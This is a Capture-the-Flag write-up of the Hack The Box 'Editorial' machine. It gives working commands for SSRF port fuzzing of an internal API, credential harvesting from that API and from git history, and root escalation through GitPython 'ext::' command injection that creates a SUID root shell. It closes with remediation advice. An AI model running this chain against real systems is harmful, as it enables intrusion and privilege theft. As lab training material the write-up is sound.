# Editorial HTB 

## Executive Summary

This comprehensive penetration testing report documents the complete exploitation of the Editorial HTB machine, covering reconnaissance, vulnerability assessment, exploitation, and post-exploitation activities. The target demonstrated multiple security weaknesses including SSRF vulnerabilities, information disclosure, and privilege escalation via vulnerable GitPython implementation.


## Initial Reconnaissance

### Target Setup
```bash
export target=10.129.9.82
echo "10.129.9.82 editorial.htb" | sudo tee -a /etc/hosts
```

<img width="340" height="58" alt="image" src="https://github.com/user-attachments/assets/9b20fac9-7b6d-4eb2-8c1d-2a405369b02e" />

### Network Scanning

**Comprehensive Port Scan:**
```bash
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="705" height="216" alt="image" src="https://github.com/user-attachments/assets/2e7d393b-a866-4bbd-a863-e80affd3ad2d" />

**Results:**
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

**Service Version Detection:**
```bash
sudo nmap -sC -sV -p 22,80 -T4 $target
```

<img width="775" height="369" alt="image" src="https://github.com/user-attachments/assets/0fa28111-96e8-4b2c-8646-04c07629b495" />

---

## Web Application Assessment

### Initial Enumeration

The web application hosted on port 80 revealed an upload functionality at `http://editorial.htb/upload` that was found to generate outbound HTTP requests.

<img width="775" height="369" alt="image" src="https://github.com/user-attachments/assets/62054cd9-45cd-44d0-b8e2-b53f1f6fd7d8" />

### SSRF Vulnerability Discovery

**Intercepted Request Analysis:**
```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------18468863312856139189471193778
Content-Length: 362
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=0

-----------------------------18468863312856139189471193778
Content-Disposition: form-data; name="bookurl"
http://10.10.14.71:80/
-----------------------------18468863312856139189471193778
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------18468863312856139189471193778--
```

<img width="577" height="552" alt="image" src="https://github.com/user-attachments/assets/d1e1aa92-c92e-4189-9f68-0ecf3e65015d" />

**Server Response:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
Date: Thu, 13 Nov 2025 01:42:42 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 61

/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

<img width="575" height="270" alt="image" src="https://github.com/user-attachments/assets/8d06c762-6997-49e9-a6e5-f991b7edb56c" />

### SSRF Confirmation and Port Discovery

**Testing Internal Services:**
```bash
# Save the request to file for fuzzing
cat > request.req << 'EOF'
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------18468863312856139189471193778
Content-Length: 362
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=0

-----------------------------18468863312856139189471193778
Content-Disposition: form-data; name="bookurl"
http://127.0.0.1:FUZZ/
-----------------------------18468863312856139189471193778
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------18468863312856139189471193778--
EOF

# Port discovery via fuzzing
ffuf -request request.req -request-proto http -w <(seq 1 65535) -ac
```

<img width="753" height="339" alt="image" src="https://github.com/user-attachments/assets/b8943335-f8dd-44f8-bae1-4439fb2dda11" />

<img width="1233" height="537" alt="image" src="https://github.com/user-attachments/assets/225630b6-774e-4280-afb7-728626077df7" />

**Discovery:** Internal service running on **port 5000**

---

## Internal Service Discovery

### API Endpoint Enumeration

**Accessing Internal Service:**
```bash
# Using SSRF to access internal service
curl -X POST http://editorial.htb/upload-cover \
  -F "bookurl=http://127.0.0.1:5000/" \
  -F "bookfile=@/dev/null"
```

**Response Analysis:**
The server returned a UUID file path: `/static/uploads/79ca0f80-ccaf-48f9-8d1c-61c0601b5204`

**API Metadata Retrieval:**
```bash
curl -s http://editorial.htb/static/uploads/79ca0f80-ccaf-48f9-8d1c-61c0601b5204 | jq .
```

<img width="718" height="908" alt="image" src="https://github.com/user-attachments/assets/40c1b8af-628c-4fef-8fc1-f9a94fae437d" />

**API Structure Discovered:**
```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

---

## Credential Harvesting

### Author Information Disclosure

**Accessing Authors Endpoint:**
```bash
curl -X POST http://editorial.htb/upload-cover \
  -F "bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors" \
  -F "bookfile=@/dev/null"
```

<img width="926" height="725" alt="image" src="https://github.com/user-attachments/assets/04e74b66-a933-4f46-bfb8-0aec5ac7ca0a" />


**Retrieved Credential File:**
```bash
curl -s http://editorial.htb/static/uploads/9617b4f8-15bb-410e-929c-bd9131c0560a | jq .
```

<img width="952" height="204" alt="image" src="https://github.com/user-attachments/assets/d34b0fb1-002e-47d0-b6e2-9ae957d13144" />

**Credentials Exposed:**
```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

---

## Initial Compromise

### SSH Access Validation

**Credential Verification:**
```bash
crackmapexec ssh 10.129.9.82 -u dev -p 'dev080217_devAPI!@'
```

<img width="775" height="86" alt="image" src="https://github.com/user-attachments/assets/6cbc75f0-47c9-48b5-9f38-df4052c24464" />

**Successful SSH Access:**
```bash
ssh dev@10.129.9.82
```

<img width="703" height="443" alt="image" src="https://github.com/user-attachments/assets/ded991cc-36ae-4a3c-a4bf-d65db7243979" />

**User Flag Acquisition:**
```bash
dev@editorial:~$ cat /home/dev/user.txt
79129e7f798cb5bb158236b1b9b4ef7d
```

---

## Lateral Movement

### Source Code Analysis

**Git Repository Examination:**
```bash
dev@editorial:~/apps$ git log --oneline
b73481b (HEAD) change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

**Code Change Analysis:**
```bash
dev@editorial:~/apps$ git diff b73481b 1e84a03
```

<img width="952" height="470" alt="image" src="https://github.com/user-attachments/assets/e880ffd3-edc2-41d4-87bb-eb461b40f379" />

**Production Credentials Discovered:**
```diff
-        'template_mail_message': "Welcome to the team! ... Username: dev\nPassword: dev080217_devAPI!@\n..."
+        'template_mail_message': "Welcome to the team! ... Username: prod\nPassword: 080217_Producti0n_2023!@\n..."
```

### Privilege Escalation to prod User

**User Switching:**
```bash
dev@editorial:~$ su prod
Password: 080217_Producti0n_2023!@
```

---

## Privilege Escalation

### Sudo Privilege Assessment

**Sudo Rights Enumeration:**
```bash
prod@editorial:~$ sudo -l
```

**Results:**
```
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

<img width="949" height="447" alt="image" src="https://github.com/user-attachments/assets/1a7fa806-2910-45af-86c8-6e18406889a0" />

### Vulnerable Script Analysis

**Script Content:**
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

**Dependency Analysis:**
```bash
prod@editorial:~$ pip freeze | grep -i "git"
gitdb==4.0.10
GitPython==3.1.29
```

<img width="372" height="79" alt="image" src="https://github.com/user-attachments/assets/c8726331-4266-4e59-a7e2-c6965d39c29c" />

### GitPython Vulnerability Exploitation

**CVE Research:** GitPython 3.1.29 vulnerable to command injection via Git protocol.

**Proof of Concept:**
```python
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

### Exploitation Execution

**Initial Test:**
```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```

**Error Output (Expected):**
```
Traceback (most recent call last):
  [...]
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
```

**Verification:**
```bash
prod@editorial:~$ ls -l /tmp/pwned
-rw-r--r-- 1 root root 0 Nov 13 02:40 /tmp/pwned
```

### Privilege Escalation Payload

**Root Shell Creation Script:**
```bash
prod@editorial:~$ cat > /dev/shm/script.sh << 'EOF'
#!/bin/bash
cp /bin/sh /tmp/aravi
chown root:root /tmp/aravi
chmod 6777 /tmp/aravi
EOF

prod@editorial:~$ chmod +x /dev/shm/script.sh
```

**Exploitation:**
```bash
prod@editorial:~$ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /dev/shm/script.sh'
```

<img width="964" height="744" alt="image" src="https://github.com/user-attachments/assets/1589d00f-7528-48d8-9240-26c123a02cc8" />


---

## Root Compromise

### Root Access Verification

**Privileged Shell Execution:**
```bash
prod@editorial:~$ /tmp/aravi -p
```

**System Information:**
```bash
# id; whoami; hostname; uname -r
uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root) groups=0(root),1000(prod)
root
editorial
5.15.0-112-generic
```

**Root Flag Acquisition:**
```bash
# cat /root/root.txt
a0bbc38cb6804e4f1942271c619b1844
```

---

## Security Recommendations

### Critical Vulnerabilities Identified

1. **SSRF Vulnerability** (Critical)
   - **Location**: `/upload-cover` endpoint
   - **Impact**: Internal service enumeration and data exfiltration
   - **Remediation**: Implement strict URL validation, whitelist allowed domains

2. **Information Disclosure** (High)
   - **Location**: Internal API endpoints
   - **Impact**: Exposure of sensitive credentials and system metadata
   - **Remediation**: Implement proper authentication and access controls

3. **Hardcoded Credentials** (High)
   - **Location**: Version control system and API responses
   - **Impact**: Unauthorized system access
   - **Remediation**: Implement secure credential management, remove credentials from codebase

4. **Insecure Sudo Configuration** (High)
   - **Location**: Sudoers configuration
   - **Impact**: Privilege escalation via command injection
   - **Remediation**: Follow principle of least privilege, audit privileged scripts

5. **Vulnerable Dependencies** (High)
   - **Location**: GitPython 3.1.29
   - **Impact**: Remote code execution
   - **Remediation**: Regular dependency updates, security scanning

### Additional Security Measures

1. **Network Segmentation**
   - Isolate internal services from external access
   - Implement proper firewall rules

2. **Input Validation**
   - Sanitize all user inputs, especially URL parameters
   - Implement content security policies

3. **Monitoring and Logging**
   - Implement comprehensive logging of authentication attempts
   - Monitor for suspicious file access patterns

4. **Secure Development Practices**
   - Regular security code reviews
   - Implement secure SDLC processes


<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style> 
